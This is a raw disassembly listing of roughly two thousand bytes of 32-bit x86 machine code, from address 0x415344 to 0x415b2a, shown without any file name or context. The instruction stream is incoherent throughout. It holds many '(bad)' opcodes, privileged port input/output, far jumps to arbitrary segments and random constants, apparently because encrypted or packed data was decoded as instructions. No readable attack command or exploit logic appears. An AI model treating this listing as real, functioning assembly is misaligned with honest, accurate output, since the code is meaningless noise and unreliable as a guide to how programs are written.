  415344:	in     eax,dx
  415345:	jne    0x415313
  415347:	fstp   st(5)
  415349:	inc    ebp
  41534a:	aad    0xc2
  41534c:	outs   dx,BYTE PTR ds:[esi]
  41534d:	inc    edi
  41534e:	xchg   edx,eax
  41534f:	test   DWORD PTR [eax+0x67],ecx
  415352:	fwait
  415353:	jg     0x41530e
  415355:	test   DWORD PTR [ecx-0x3],edx
  415358:	in     eax,0x17
  41535a:	dec    edx
  41535b:	arpl   WORD PTR [edi-0x73],cx
  41535e:	cmp    eax,0xddcb03d9
  415363:	push   edi
  415364:	dec    eax
  415365:	ja     0x41530a
  415367:	pop    DWORD PTR [edx]
  415369:	mov    eax,0x941b9b7a
  41536e:	lahf   
  41536f:	cmp    al,0x90
  415371:	inc    ebx
  415372:	mov    edi,0xe09f26f2
  415377:	fisttp WORD PTR [edi-0x275bba87]
  41537d:	adc    eax,0xca70cbd6
  415382:	or     dl,BYTE PTR [edi+0x53d5644]
  415388:	push   0xffffffe4
  41538a:	arpl   WORD PTR [ecx],bp
  41538c:	punpckhdq mm1,QWORD PTR ds:0xe6d67aa8
  415393:	or     al,0x78
  415395:	lods   al,BYTE PTR ds:[esi]
  415396:	leave  
  415397:	xchg   ecx,eax
  415398:	(bad)  
  415399:	push   eax
  41539a:	jecxz  0x41534c
  41539c:	outs   dx,BYTE PTR ds:[esi]
  41539d:	xchg   ebp,eax
  41539e:	into   
  41539f:	cmp    dh,BYTE PTR [esi+0x5801e0a1]
  4153a5:	sar    BYTE PTR [edx+0x76],0xc0
  4153a9:	fmul   DWORD PTR [esi+0x23fdd788]
  4153af:	inc    ebp
  4153b0:	outs   dx,DWORD PTR ds:[esi]
  4153b1:	cld    
  4153b2:	in     eax,dx
  4153b3:	add    esp,DWORD PTR [edx-0x4b]
  4153b6:	pusha  
  4153b7:	lea    edi,[ebx-0x3bf1c7e6]
  4153bd:	mov    DWORD PTR [ecx-0x50],0xfd340087
  4153c4:	sbb    BYTE PTR [eax-0x7f74af38],ah
  4153ca:	jp     0x415394
  4153cc:	jno    0x41535c
  4153ce:	repnz lahf 
  4153d0:	jge    0x41544a
  4153d2:	repnz sbb BYTE PTR [ecx-0x5782dd9c],ah
  4153d9:	or     eax,esp
  4153db:	ja     0x4153b9
  4153dd:	sbb    eax,0xa7c6d61f
  4153e2:	jmp    0xf7142061
  4153e7:	add    ah,dl
  4153e9:	sub    BYTE PTR [eax+0x5f],0xc4
  4153ed:	inc    esi
  4153ee:	push   ecx
  4153ef:	adc    BYTE PTR [esi],cl
  4153f1:	xchg   esp,eax
  4153f2:	mov    dh,0xcf
  4153f4:	in     al,0xdb
  4153f6:	leave  
  4153f7:	int    0x62
  4153f9:	cmp    dl,BYTE PTR [edx-0x38]
  4153fc:	adc    bh,dh
  4153fe:	mov    BYTE PTR [esi],ah
  415400:	(bad)  
  415401:	sub    al,al
  415403:	loop   0x4153eb
  415405:	lods   al,BYTE PTR ds:[esi]
  415406:	scas   eax,DWORD PTR es:[edi]
  415407:	pop    edi
  415408:	repnz rcr esi,1
  41540b:	push   ebp
  41540c:	pushf  
  41540d:	gs dec esp
  41540f:	mov    WORD PTR [edi],gs
  415411:	or     al,0x7b
  415413:	adc    eax,0x9be10698
  415418:	stc    
  415419:	(bad)  
  41541a:	xchg   edx,eax
  41541b:	fdivrp st(5),st
  41541d:	not    BYTE PTR [esi]
  41541f:	fist   DWORD PTR [esp+esi*4-0x3606daf2]
  415426:	aas    
  415427:	div    edx
  415429:	stc    
  41542a:	jge    0x41546f
  41542c:	xor    DWORD PTR [edi+0x7ac30e5b],ebx
  415432:	popf   
  415433:	xchg   BYTE PTR [ebx+0x5e],ch
  415436:	(bad)
  415439:	push   eax
  41543a:	std    
  41543b:	fs add bl,bh
  41543e:	pop    edx
  41543f:	push   esi
  415440:	test   eax,0xbfe361b6
  415445:	jno    0x415400
  415447:	jb     0x4153fc
  415449:	fsub   DWORD PTR [ecx-0x200b5949]
  41544f:	push   0xf4be27cf
  415454:	and    al,0x8f
  415456:	test   BYTE PTR [eax-0x16],bh
  415459:	push   edx
  41545a:	pop    ebx
  41545b:	scas   eax,DWORD PTR es:[edi]
  41545c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41545d:	leave  
  41545e:	adc    al,0xb2
  415460:	sti    
  415461:	xor    eax,0x465203ac
  415466:	in     al,0x5b
  415468:	test   BYTE PTR [ecx-0x1faa0180],bh
  41546e:	adc    dh,dh
  415470:	mov    edi,0xd7129d8b
  415475:	idiv   DWORD PTR [ebx+0x12]
  415478:	mov    ecx,0x32af763b
  41547d:	leave  
  41547e:	mov    BYTE PTR [edx+0x3a5a2000],0xa3
  415485:	cdq    
  415486:	out    0x83,eax
  415488:	cmp    edi,eax
  41548a:	test   edx,edi
  41548c:	mov    DWORD PTR [eax+ebp*2-0x65],ebx
  415490:	pop    ds
  415491:	xchg   esp,eax
  415492:	jp     0x415463
  415494:	jecxz  0x4154b0
  415496:	dec    eax
  415497:	dec    dh
  415499:	jecxz  0x41549b
  41549b:	bound  edx,QWORD PTR [eax-0x7]
  41549e:	inc    eax
  41549f:	int    0x48
  4154a1:	jge    0x4154a6
  4154a3:	push   esp
  4154a4:	dec    edi
  4154a5:	jbe    0x41547f
  4154a7:	cmp    eax,0x5d646a13
  4154ac:	test   al,0x5e
  4154ae:	adc    eax,0x5468168c
  4154b3:	in     al,dx
  4154b4:	cmp    edi,edi
  4154b6:	dec    eax
  4154b7:	jp     0x4154f1
  4154b9:	jmp    0x2989:0x8736c337
  4154c0:	int3   
  4154c1:	sbb    eax,0x7c505893
  4154c6:	cmp    eax,0x845068cd
  4154cb:	das    
  4154cc:	mov    al,0x5d
  4154ce:	jmp    0xeac1fcb1
  4154d3:	cmc    
  4154d4:	cwde   
  4154d5:	pop    ebx
  4154d6:	jecxz  0x415539
  4154d8:	push   esp
  4154d9:	pop    DWORD PTR [ecx+0x17a437c5]
  4154df:	ret    
  4154e0:	xchg   ebx,eax
  4154e1:	imul   ecx,DWORD PTR [ecx-0x55],0x0
  4154e5:	pop    edi
  4154e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154e7:	popf   
  4154e8:	fcom   DWORD PTR [ebx-0x44e7df1d]
  4154ee:	xor    al,0xda
  4154f0:	std    
  4154f1:	aaa    
  4154f2:	push   ds
  4154f3:	push   ss
  4154f4:	mov    dh,0x8d
  4154f6:	xchg   ecx,eax
  4154f7:	dec    ecx
  4154f8:	mov    BYTE PTR [ecx],cl
  4154fa:	rcr    DWORD PTR [edi],cl
  4154fc:	jae    0x41548b
  4154fe:	das    
  4154ff:	ret    
  415500:	(bad)  
  415501:	leave  
  415502:	mov    dh,0xf8
  415504:	test   esi,esp
  415506:	push   ss
  415507:	dec    edi
  415508:	repz test BYTE PTR [ebp-0x32cea784],cl
  41550f:	cmc    
  415510:	add    eax,0x4accd8e4
  415515:	pop    esp
  415516:	stc    
  415517:	mov    edi,0xd922733d
  41551c:	push   esp
  41551d:	(bad)  
  41551e:	xor    WORD PTR [eax],si
  415521:	mov    DWORD PTR [ebx-0x338dbb46],ebx
  415527:	test   al,0xb6
  415529:	nop
  41552a:	bound  edi,QWORD PTR [edi-0x7f2061ec]
  415530:	adc    eax,0x4e4b3ea6
  415535:	mov    ah,0x1a
  415537:	in     al,0x8b
  415539:	ret    0x3ab0
  41553c:	bound  ebx,QWORD PTR [esi]
  41553e:	lahf   
  41553f:	fwait
  415540:	add    BYTE PTR [ebp-0x72e4f650],dh
  415546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415547:	les    ebx,FWORD PTR [esi+eax*2+0x25]
  41554b:	shl    BYTE PTR [edx-0x328fa448],0x76
  415552:	lock cwde 
  415554:	adc    DWORD PTR [ebx+0x45],esi
  415557:	lock addr16 popa 
  41555a:	sbb    dh,al
  41555c:	cmp    BYTE PTR [esi+0x386deb2b],cl
  415562:	sar    ah,0x62
  415565:	fistp  WORD PTR [ebx-0x16]
  415568:	adc    BYTE PTR [esi],ah
  41556a:	cmp    ebp,DWORD PTR [esi-0x26688b86]
  415570:	and    eax,0x68e64b9d
  415575:	jmp    0xd8feaeaa
  41557a:	(bad)  
  41557b:	mov    dl,0xce
  41557d:	adc    al,ah
  41557f:	out    0xe7,eax
  415581:	jl     0x41553a
  415583:	mov    ecx,DWORD PTR [ecx-0x1240be65]
  415589:	sbb    bh,BYTE PTR [ebx+0x54bf0098]
  41558f:	add    DWORD PTR [edi+0x4c5ad9b4],esi
  415595:	push   ebp
  415596:	push   edi
  415597:	mov    dl,0x68
  415599:	mov    gs,WORD PTR [ebp+0x2f]
  41559c:	in     al,0x6f
  41559e:	ss push es
  4155a0:	data16 daa 
  4155a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155a3:	jae    0x415541
  4155a5:	cwde   
  4155a6:	mov    ecx,DWORD PTR [esi]
  4155a8:	xor    BYTE PTR [ebx+esi*1],0x8a
  4155ac:	mov    ds:0x94b07f83,al
  4155b1:	pop    esi
  4155b2:	retf   0xf6f5
  4155b5:	xchg   esi,esp
  4155b7:	rcl    BYTE PTR [ecx],1
  4155b9:	pop    ecx
  4155ba:	adc    al,0x0
  4155bc:	mov    edi,0x3c993498
  4155c1:	jo     0x415606
  4155c3:	mov    al,ds:0xce559345
  4155c8:	cmp    al,0x4c
  4155ca:	cmp    eax,0xf3e7671
  4155cf:	jo     0x4155ec
  4155d1:	and    ebx,edi
  4155d3:	into   
  4155d4:	mov    eax,ds:0x5cbefc13
  4155d9:	pusha  
  4155da:	cld    
  4155db:	adc    al,0x67
  4155dd:	adc    ebx,DWORD PTR [ebp+0x66]
  4155e0:	cmp    esp,DWORD PTR [edx+0x33]
  4155e3:	or     BYTE PTR [ebx+0x23],ch
  4155e6:	xlat   BYTE PTR ds:[ebx]
  4155e7:	arpl   WORD PTR [ecx],ax
  4155e9:	and    edx,DWORD PTR [edx+0x4b7f3673]
  4155ef:	ret    
  4155f0:	and    al,0x6f
  4155f2:	jp     0x4155af
  4155f4:	cs xchg ecx,eax
  4155f6:	sbb    DWORD PTR [edx-0x3de3dac5],edi
  4155fc:	shl    BYTE PTR ds:0xdc99481,1
  415602:	inc    eax
  415603:	(bad)  
  415604:	ins    BYTE PTR es:[edi],dx
  415605:	sbb    dh,BYTE PTR [edx-0x59faff8]
  41560b:	gs jo  0x415604
  41560e:	pop    esp
  41560f:	pushf  
  415610:	cld    
  415611:	into   
  415612:	adc    ebp,DWORD PTR [ecx-0x34774471]
  415618:	push   ebx
  415619:	jbe    0x415635
  41561b:	push   ebp
  41561c:	xor    DWORD PTR [eax],esi
  41561e:	adc    al,0x94
  415620:	popf   
  415621:	inc    esp
  415622:	push   0xffffff9b
  415624:	adc    eax,0x48555f13
  415629:	cmp    esi,edx
  41562b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41562c:	loope  0x4155fa
  41562e:	imul   ecx,edx,0x4e
  415631:	pop    edi
  415632:	sub    DWORD PTR [edx-0x1ead35d7],esp
  415638:	fnstenv [ecx-0x1e3c56fe]
  41563e:	mov    eax,ds:0x48fc2985
  415643:	fcmovnb st,st(1)
  415645:	and    eax,0x9c302493
  41564a:	mov    ebx,0x87aabbb8
  41564f:	dec    esp
  415650:	outs   dx,DWORD PTR ds:[esi]
  415651:	mov    ebp,0x323a37de
  415656:	nop
  415657:	loopne 0x415610
  415659:	fcom   QWORD PTR [edx+0x4]
  41565c:	pop    edi
  41565d:	popa   
  41565e:	ror    ecx,0x65
  415661:	push   es
  415662:	xchg   ebp,eax
  415663:	and    dl,dh
  415665:	out    0xad,al
  415667:	xchg   DWORD PTR ds:0x11b338ce,ebx
  41566d:	(bad)  
  41566e:	out    dx,eax
  41566f:	mov    ah,0x86
  415671:	mov    al,ds:0x846f41d6
  415676:	rcr    DWORD PTR [ebx],1
  415678:	push   ebp
  415679:	outs   dx,BYTE PTR ds:[esi]
  41567a:	fisttp QWORD PTR [esi-0x4bd3918e]
  415680:	(bad)  
  415681:	les    eax,FWORD PTR [eax+ebx*1-0x5f]
  415685:	cmp    bh,ah
  415687:	addps  xmm6,XMMWORD PTR [ebx+0x1c]
  41568b:	sbb    al,bh
  41568d:	lock mov eax,ds:0x7910a527
  415693:	jbe    0x415651
  415695:	jmp    0x4156d4
  415697:	cmc    
  415698:	(bad)  
  41569a:	call   0x5cabaa8b
  41569f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156a0:	pop    esi
  4156a1:	sub    eax,DWORD PTR [esi-0x61fb2598]
  4156a7:	inc    edx
  4156a8:	nop
  4156a9:	ror    DWORD PTR ds:0x73d51f4,1
  4156af:	ret    0x89e0
  4156b2:	scas   eax,DWORD PTR es:[edi]
  4156b3:	push   0x4b
  4156b5:	add    eax,0xebdf0b42
  4156ba:	das    
  4156bb:	mov    ch,0x78
  4156bd:	out    dx,eax
  4156be:	in     eax,dx
  4156bf:	add    BYTE PTR [esp+edi*2-0x7951ebac],0x34
  4156c7:	aam    0x54
  4156c9:	pop    ss
  4156ca:	cmp    dx,cx
  4156cd:	xlat   BYTE PTR ds:[ebx]
  4156ce:	adc    DWORD PTR [edi],edi
  4156d0:	sbb    al,0xd2
  4156d2:	mov    bh,al
  4156d4:	gs (bad) 
  4156d6:	mov    bl,0xd1
  4156d8:	loope  0x4156a0
  4156da:	aas    
  4156db:	mov    bl,0x1d
  4156dd:	push   ds
  4156de:	jecxz  0x4156b9
  4156e0:	pop    eax
  4156e1:	test   al,0xa7
  4156e3:	inc    eax
  4156e4:	repnz mov edx,0x5f3d80f0
  4156ea:	cmp    al,0x38
  4156ec:	sub    edi,DWORD PTR [eax]
  4156ee:	(bad)  
  4156ef:	pop    edi
  4156f0:	int3   
  4156f1:	adc    eax,0x74e1ef85
  4156f6:	out    0xb8,al
  4156f8:	jb     0x415705
  4156fa:	es pop eax
  4156fc:	push   edi
  4156fd:	sbb    dl,bh
  4156ff:	jo     0x415761
  415701:	out    dx,eax
  415702:	mov    edx,0xfd3cda4a
  415707:	fist   DWORD PTR [esi+0x4b]
  41570a:	hlt    
  41570b:	dec    esi
  41570c:	pusha  
  41570d:	repz xor al,0xe9
  415710:	mov    eax,0xd847aa0a
  415715:	fwait
  415716:	rol    BYTE PTR [edi+0x14],cl
  415719:	mov    edi,0x97254eda
  41571e:	xor    ebx,ecx
  415720:	out    dx,al
  415721:	dec    ecx
  415722:	retf   
  415723:	inc    esi
  415724:	lods   eax,DWORD PTR ds:[esi]
  415725:	outs   dx,BYTE PTR ds:[esi]
  415726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415727:	lock enter 0xbf94,0x7e
  41572c:	adc    edi,DWORD PTR [edx-0x29867a38]
  415732:	popf   
  415733:	fwait
  415734:	inc    esi
  415735:	out    dx,al
  415736:	pop    esp
  415737:	or     al,0x7a
  415739:	loope  0x4156c9
  41573b:	mov    dl,0xbf
  41573d:	xor    ch,al
  41573f:	sbb    al,0xbb
  415741:	sahf   
  415742:	xor    edi,esp
  415744:	aad    0x7f
  415746:	stos   DWORD PTR es:[edi],eax
  415747:	fidivr WORD PTR [ebp+0x65]
  41574a:	cmp    al,0x91
  41574c:	aam    0xcb
  41574e:	push   es
  41574f:	loopne 0x41570e
  415751:	cmp    bl,BYTE PTR [ebx]
  415753:	mov    ch,0xdf
  415755:	test   BYTE PTR [eax],0x1e
  415758:	mov    dh,0x3e
  41575a:	mov    ah,0x67
  41575c:	xchg   edi,eax
  41575d:	jae    0x41578c
  41575f:	dec    eax
  415760:	sbb    ecx,edi
  415762:	pop    eax
  415763:	add    BYTE PTR [eax-0x4db89807],dh
  415769:	pop    esp
  41576a:	addr16 pop edi
  41576c:	jp     0x415707
  41576e:	ficom  DWORD PTR ds:0x9dbdacd6
  415774:	push   ss
  415775:	daa    
  415776:	cmp    ebp,DWORD PTR [edi+0x76666c56]
  41577c:	aad    0xcb
  41577e:	fs (bad) 
  415780:	call   0x9cd371de
  415785:	push   edx
  415786:	add    DWORD PTR [edi],esp
  415788:	adc    al,0x47
  41578a:	je     0x4157e8
  41578c:	jmp    0x4157c1
  41578e:	mov    dh,0x9
  415790:	fwait
  415791:	add    DWORD PTR [edi-0x78],edx
  415794:	enter  0x7271,0xa5
  415798:	mov    esi,DWORD PTR [eax-0x70]
  41579b:	xor    al,0xc5
  41579d:	jnp    0x4157d5
  41579f:	data16 sub BYTE PTR [esi+eax*1],ch
  4157a3:	mov    gs,edi
  4157a5:	rol    dh,cl
  4157a7:	push   ecx
  4157a8:	fist   DWORD PTR [ecx]
  4157aa:	ins    BYTE PTR es:[edi],dx
  4157ab:	adc    eax,0xbf13e07f
  4157b0:	(bad)  
  4157b2:	jmp    0x26fa4fbf
  4157b7:	fbstp  TBYTE PTR [eax-0x6b]
  4157ba:	pop    edx
  4157bb:	stos   BYTE PTR es:[edi],al
  4157bc:	jno    0x415781
  4157be:	mov    ch,0x11
  4157c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157c1:	jge    0x4157c4
  4157c3:	or     esp,edx
  4157c5:	dec    edi
  4157c6:	call   0x4460:0x3ad7824f
  4157cd:	sbb    eax,0xcb7ecde5
  4157d2:	jmp    0xf91bf7b1
  4157d7:	fdivr  st,st(5)
  4157d9:	xchg   ebx,eax
  4157da:	sbb    al,0x1c
  4157dc:	popa   
  4157dd:	xor    eax,0x5a23629c
  4157e2:	xor    al,BYTE PTR [ecx-0x1a]
  4157e5:	fistp  DWORD PTR [edi]
  4157e7:	test   DWORD PTR [ebx-0x3f8cb832],esi
  4157ed:	lds    esi,FWORD PTR [ebp-0x7384344c]
  4157f3:	dec    dh
  4157f5:	loopne 0x4157a5
  4157f7:	test   eax,0x55ae163a
  4157fc:	in     eax,dx
  4157fd:	add    eax,0x3872321f
  415802:	int    0x1b
  415804:	mov    eax,ds:0x41e4e6c5
  415809:	mov    esi,DWORD PTR cs:[esi+0x23]
  41580d:	cmp    edi,esp
  41580f:	jne    0x4157c8
  415811:	icebp  
  415812:	in     al,dx
  415813:	(bad)  
  415814:	fcom   QWORD PTR [ecx+0x3f347169]
  41581a:	cmp    dh,ah
  41581c:	sub    ch,BYTE PTR [ecx-0x32]
  41581f:	neg    ebp
  415821:	pusha  
  415822:	jmp    0x4157ed
  415824:	dec    ebp
  415825:	xlat   BYTE PTR ds:[ebx]
  415826:	add    BYTE PTR [edx+0x1e079831],ch
  41582c:	dec    edx
  41582d:	or     al,0x75
  41582f:	ds mov al,0xf2
  415832:	daa    
  415833:	sub    edx,eax
  415835:	sub    esi,DWORD PTR [edi+0x30ef8761]
  41583b:	and    eax,0xa8e34307
  415840:	dec    ah
  415842:	jo     0x4157d6
  415844:	add    DWORD PTR [esi],0xffffffe0
  415847:	and    BYTE PTR [eax+0x57],cl
  41584a:	pop    edx
  41584b:	mov    esi,0x6ebbae19
  415850:	xor    eax,0x548e1057
  415855:	push   0xffffffb7
  415857:	jo     0x41581c
  415859:	loop   0x4158c9
  41585b:	or     BYTE PTR [ecx],0xb2
  41585e:	aam    0x5d
  415860:	test   eax,0x3752f97d
  415865:	test   al,al
  415867:	fwait
  415868:	xor    dh,cl
  41586a:	retf   0xb006
  41586d:	jg     0x4157f8
  41586f:	fsub   QWORD PTR [esi]
  415871:	out    dx,eax
  415872:	dec    esi
  415873:	fidivr WORD PTR [edx-0x792ee208]
  415879:	out    0x40,al
  41587b:	pusha  
  41587c:	aas    
  41587d:	stos   BYTE PTR es:[edi],al
  41587e:	jnp    0x4158a9
  415880:	ret    0xcf0a
  415883:	and    DWORD PTR [ebx],ebx
  415885:	sbb    BYTE PTR [ecx+0x3a],cl
  415888:	or     DWORD PTR [edx+0x1a866ddf],edi
  41588e:	cmp    al,0xb3
  415890:	aad    0x8a
  415892:	dec    ecx
  415893:	out    dx,eax
  415894:	enter  0xa6d0,0xf3
  415898:	jno    0x415844
  41589a:	adc    ah,BYTE PTR gs:[edx+0x2c]
  41589e:	xor    bh,al
  4158a0:	dec    ebp
  4158a1:	div    bh
  4158a3:	inc    eax
  4158a4:	retf   
  4158a5:	sub    al,0xea
  4158a7:	mov    eax,ds:0x376931a8
  4158ac:	gs pop ss
  4158ae:	outs   dx,BYTE PTR ds:[esi]
  4158af:	mov    dh,0x94
  4158b1:	movaps xmm5,XMMWORD PTR [ebp+eax*1-0x76b674e8]
  4158b9:	jmp    0x7364:0xc4bb346b
  4158c0:	pop    eax
  4158c1:	push   ss
  4158c2:	in     eax,dx
  4158c3:	jecxz  0x415877
  4158c5:	jnp    0x41592a
  4158c7:	dec    edx
  4158c8:	stc    
  4158c9:	pop    es
  4158ca:	cmc    
  4158cb:	xchg   edi,eax
  4158cc:	mov    ah,0xbb
  4158ce:	xchg   DWORD PTR [eax*4-0x1040736f],esi
  4158d5:	sub    bh,bl
  4158d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d8:	sti    
  4158d9:	fld1   
  4158db:	adc    al,0xa1
  4158dd:	lea    ecx,[edi-0x200535e6]
  4158e3:	icebp  
  4158e4:	std    
  4158e5:	call   0x5aa2:0x5f6f159c
  4158ec:	icebp  
  4158ed:	fwait
  4158ee:	lods   al,BYTE PTR ds:[esi]
  4158ef:	mov    ds,esp
  4158f1:	mov    eax,0x93f1523a
  4158f6:	(bad)  
  4158f7:	repz std 
  4158f9:	cmp    BYTE PTR ss:[ebp-0x4b],ah
  4158fd:	xchg   ebp,eax
  4158fe:	in     al,0x34
  415900:	outs   dx,BYTE PTR ds:[esi]
  415901:	rcr    DWORD PTR [esi+0x3d],1
  415904:	addr16 js 0x415970
  415907:	ja     0x4158f4
  415909:	cli    
  41590a:	jmp    0x4158cd
  41590c:	xor    edx,DWORD PTR [ecx]
  41590e:	jbe    0x415971
  415910:	sti    
  415911:	cmp    eax,ecx
  415913:	lea    esp,[ecx-0x50]
  415916:	pop    edi
  415917:	xchg   ecx,eax
  415918:	fnstcw WORD PTR [edi-0xa6d5ad9]
  41591e:	stc    
  41591f:	call   0x9bd1:0xe0837531
  415926:	clc    
  415927:	jns    0x415929
  415929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41592a:	loope  0x415924
  41592c:	mov    DWORD PTR [ebx+0x34],ecx
  41592f:	push   0xffffffd0
  415931:	sub    edi,DWORD PTR [ecx]
  415933:	daa    
  415934:	jb     0x415905
  415936:	sbb    DWORD PTR [ebx-0x1e],esp
  415939:	bound  edx,QWORD PTR [ebp+0x7]
  41593c:	ret    
  41593d:	and    ch,dh
  41593f:	enter  0x40ab,0x3e
  415943:	pop    esp
  415944:	lods   eax,DWORD PTR ds:[esi]
  415945:	sub    al,0x44
  415947:	xchg   ebp,eax
  415948:	inc    edi
  415949:	mov    bl,0x3f
  41594b:	push   edi
  41594c:	sbb    DWORD PTR [edi-0x7a083ee9],edx
  415952:	retf   
  415953:	xor    cl,0x2e
  415956:	scas   al,BYTE PTR es:[edi]
  415957:	mov    ebx,DWORD PTR [ebx]
  415959:	int    0xd5
  41595b:	and    BYTE PTR [eax],al
  41595d:	xchg   BYTE PTR es:[esi+0xfa7fb81],cl
  415964:	hlt    
  415965:	loop   0x4159cb
  415967:	scas   eax,DWORD PTR es:[edi]
  415968:	ret    
  415969:	and    eax,0xbc2f12d6
  41596e:	fwait
  41596f:	dec    ecx
  415970:	rcr    ecx,1
  415972:	push   0x65
  415974:	das    
  415975:	xchg   edx,eax
  415976:	adc    eax,0x7d6e7f62
  41597b:	outs   dx,DWORD PTR ds:[esi]
  41597c:	sti    
  41597d:	cli    
  41597e:	out    dx,al
  41597f:	pop    ebx
  415980:	push   esp
  415981:	dec    edx
  415982:	push   eax
  415983:	inc    ebp
  415984:	(bad)  
  415985:	pop    edi
  415986:	and    dl,BYTE PTR [esi-0x41]
  415989:	cmp    DWORD PTR [ebx],ebp
  41598b:	out    0x7c,eax
  41598d:	(bad)  
  41598f:	ss jno 0x4159c8
  415992:	in     al,dx
  415993:	cmp    dh,BYTE PTR [ebp-0x44]
  415996:	shl    bh,cl
  415998:	and    DWORD PTR [edi-0x1c1f551e],ebx
  41599e:	mov    eax,ds:0xdd879d2c
  4159a3:	push   0x9
  4159a5:	cmp    dh,BYTE PTR [ebp+0x42]
  4159a8:	adc    al,0x43
  4159aa:	retf   
  4159ab:	stos   BYTE PTR es:[edi],al
  4159ac:	or     eax,0xc1c3c1df
  4159b1:	(bad)  
  4159b2:	out    dx,al
  4159b3:	jne    0x41595e
  4159b5:	sbb    BYTE PTR [eax+0x45bb724b],ah
  4159bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159bc:	(bad)  
  4159bd:	enter  0x214a,0x1d
  4159c1:	pop    es
  4159c2:	test   ebp,0x2a15357a
  4159c8:	sbb    ah,cl
  4159ca:	enter  0x96c5,0x83
  4159ce:	(bad)  
  4159d0:	retf   0xaec4
  4159d3:	in     eax,dx
  4159d4:	test   BYTE PTR [esi+esi*8+0x77],ah
  4159d8:	sub    ch,BYTE PTR ss:0xbbbe04b4
  4159df:	mov    ds:0xc76dceba,al
  4159e4:	or     edx,ebp
  4159e6:	mov    eax,0x157f305f
  4159eb:	stos   BYTE PTR es:[edi],al
  4159ec:	cmc    
  4159ed:	retf   0xf895
  4159f0:	xchg   esi,eax
  4159f1:	mov    dl,0x4a
  4159f3:	outs   dx,BYTE PTR ds:[esi]
  4159f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159f5:	test   eax,0xd0ed8214
  4159fa:	out    dx,eax
  4159fb:	scas   al,BYTE PTR es:[edi]
  4159fc:	div    DWORD PTR [edi-0x56]
  4159ff:	mov    bh,0x32
  415a01:	int    0xc5
  415a03:	mov    eax,cs:0xa3ff4e52
  415a09:	mov    ebp,esp
  415a0b:	sahf   
  415a0c:	add    BYTE PTR [edi-0x2a831e50],ah
  415a12:	mov    ds:0xfcb418dc,al
  415a17:	(bad)  [edx-0x63b30206]
  415a1d:	mov    al,ds:0xd8b3fbaa
  415a22:	push   eax
  415a23:	es call 0x5639898e
  415a29:	dec    edx
  415a2a:	hlt    
  415a2b:	mov    eax,ds:0x94579237
  415a30:	lea    edi,[edx]
  415a32:	test   eax,0x121fbf42
  415a37:	sub    eax,0x873e0c4d
  415a3c:	sbb    ebx,ebp
  415a3e:	mov    ecx,0x17a99c42
  415a43:	push   edi
  415a44:	pop    edi
  415a45:	sti    
  415a46:	jne    0x415a28
  415a48:	xor    DWORD PTR [eax+ebp*2-0x67],esi
  415a4c:	out    0xb9,eax
  415a4e:	test   al,0x34
  415a50:	xchg   esp,eax
  415a51:	retf   0xa19b
  415a54:	(bad)  [esi+0x6]
  415a57:	daa    
  415a58:	push   0xd9fe319
  415a5d:	test   eax,0x96a1dd8d
  415a62:	xor    cl,0x7e
  415a65:	pushf  
  415a66:	jge    0x4159f5
  415a68:	cmp    esp,ebp
  415a6a:	adc    BYTE PTR [edx],dh
  415a6c:	(bad)  
  415a6e:	stc    
  415a6f:	enter  0xc4e1,0x14
  415a73:	aad    0x15
  415a75:	aas    
  415a76:	dec    esp
  415a77:	cmp    DWORD PTR [ebx-0x5b96fc81],edx
  415a7d:	mov    al,0x4f
  415a7f:	jge    0x415a37
  415a81:	popa   
  415a82:	lods   eax,DWORD PTR ds:[esi]
  415a83:	pop    ecx
  415a84:	lahf   
  415a85:	cs xchg dl,bl
  415a88:	jne    0x415a72
  415a8a:	loopne 0x415af8
  415a8c:	mov    edx,DWORD PTR [ebp+eiz*4-0x198f124a]
  415a93:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a95:	mov    eax,0x2da2da2b
  415a9a:	jae    0x415a2c
  415a9c:	xor    al,0xb1
  415a9e:	les    esi,FWORD PTR [edi+0x4f]
  415aa1:	add    DWORD PTR [esi-0x14],ebp
  415aa4:	cld    
  415aa5:	push   DWORD PTR [esp+esi*4+0x44def0d5]
  415aac:	sbb    eax,0xe253554
  415ab1:	add    BYTE PTR [ebp+eax*8-0x72649348],bl
  415ab8:	rcr    edx,cl
  415aba:	push   0x89b68cf0
  415abf:	adc    DWORD PTR [eax+0x63],esi
  415ac2:	mov    ah,0xbd
  415ac4:	dec    esp
  415ac5:	add    ebx,eax
  415ac7:	in     eax,dx
  415ac8:	(bad)  
  415ac9:	data16 ins BYTE PTR es:[edi],dx
  415acb:	and    dh,dh
  415acd:	sub    al,ch
  415acf:	test   edi,0x19348ec5
  415ad5:	lods   eax,DWORD PTR ds:[esi]
  415ad6:	ror    BYTE PTR [edi],0x6d
  415ad9:	xor    bh,dl
  415adb:	and    al,0x99
  415add:	add    bh,ch
  415adf:	imul   ecx,DWORD PTR [ebp+0x5fc6eba4],0x68
  415ae6:	or     al,0xf5
  415ae9:	out    dx,eax
  415aea:	mov    esi,0xb6ce826f
  415aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af0:	and    bh,BYTE PTR [edx-0x14]
  415af3:	call   0xdaf3:0xb309cbb0
  415afa:	jne    0x415ab4
  415afc:	rol    eax,0x5e
  415aff:	mov    ds:0x4777c458,eax
  415b04:	int3   
  415b05:	jge    0x415b6b
  415b07:	popa   
  415b08:	out    dx,eax
  415b09:	std    
  415b0a:	aad    0x34
  415b0c:	fincstp 
  415b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b0f:	lock adc al,BYTE PTR [esi-0x2b]
  415b13:	out    0xdd,al
  415b15:	and    eax,0x8ea1dc88
  415b1a:	mov    ebp,DWORD PTR [ebx+eiz*4-0x3e75fdb1]
  415b21:	nop
  415b22:	adc    eax,0xef242d4f
  415b27:	push   eax
  415b28:	xchg   esp,eax
  415b29:	cdq    
  415b2a:	(bad)  
